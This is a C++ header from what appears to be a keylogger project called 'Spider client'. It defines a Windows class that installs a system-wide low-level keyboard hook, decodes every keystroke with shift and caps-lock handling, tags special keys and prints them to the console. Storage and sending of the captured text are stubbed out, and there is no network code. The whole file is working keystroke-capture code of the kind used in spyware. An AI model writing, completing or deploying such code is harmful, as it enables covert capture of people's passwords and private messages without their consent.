//
// Created by etiennep on 11/8/16.
//

#ifndef SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP
#define SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP

#include <Windows.h>
#include <vector>
#include <iostream>
#include "IWindowsKeyListener.hpp"

#include <string>


HHOOK hhkLowLevelKybd;

class WindowsKeyListener : public IWindowsKeyListener {
public:
	~WindowsKeyListener() {
		UnhookWindowsHookEx(hhkLowLevelKybd);
	}

	void Run() {
		hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
		MSG msg;
		GetMessage(&msg, NULL, NULL, NULL);
	}
	
	std::string Flush() {
		return ("");
	}
	
private:
	static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wp, LPARAM lp)
	{
		if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
			static bool capslock = false;
			static bool shift = false;
			char tmp[0xFF] = { 0 };
			std::string str;
			DWORD msg = 1;
			KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
			bool printable;


			msg += (st_hook.scanCode << 16);
			msg += (st_hook.flags << 24);
			GetKeyNameText(msg, tmp, 0xFF);
			str = std::string(tmp);

			printable = (str.length() <= 1) ? true : false;

			if (!printable) {

				if (str == "CAPSLOCK")
					capslock = !capslock;
				else if (str == "SHIFT")
					shift = true;
				if (str == "ENTER") {
					str = "\n";
					printable = true;
				}
				else if (str == "SPACE") {
					str = " ";
					printable = true;
				}
				else if (str == "TAB") {
					str = "\t";
					printable = true;
				}
				else {
					str = ("[" + str + "]");
				}
			}

			if (printable) {
				if (shift == capslock) {
					for (size_t i = 0; i < str.length(); ++i)
						str[i] = tolower(str[i]);
				}
				else {
					for (size_t i = 0; i < str.length(); ++i) {
						if (str[i] >= 'A' && str[i] <= 'Z') {
							str[i] = toupper(str[i]);
						}
					}
				}

				shift = false;
			}

			std::cout << str << std::endl;
		}

		return CallNextHookEx(hhkLowLevelKybd, code, wp, lp);
	}

private:
	std::vector<std::string> _capturedCharacters;
};

#endif //SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP